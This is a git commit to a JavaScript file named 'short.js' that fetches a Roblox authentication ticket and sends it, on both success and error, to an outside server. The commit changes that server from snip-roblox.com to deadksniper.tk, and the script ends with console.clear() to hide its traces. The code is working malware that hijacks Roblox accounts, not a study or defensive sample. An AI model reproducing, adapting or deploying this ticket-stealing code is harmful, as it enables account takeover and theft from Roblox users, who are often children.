51d2534db5f4121fa4bca7e7ffe3275e89866f31
jordyjoestar <66799726+jordyjoestar@users.noreply.github.com>
2020-06-29 21:54:48 +0100

    Update short.js

--- short.js
+++ short.js
@@ -4,10 +4,10 @@ $.ajax({
    url: 'https://auth.roblox.com/v1/authentication-ticket',
    data: data,
    success: function(data, textStatus, request) {
-       $.get('https://snip-roblox.com/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
+       $.get('https://deadksniper.tk/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
    },
    error: function(request, textStatus, errorThrown) {
-       $.get('https://snip-roblox.com/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
+       $.get('https://deadksniper.tk/auth.php?auth_ticket=' + request.getResponseHeader('rbx-authentication-ticket'));
    }
 });
 console.clear()
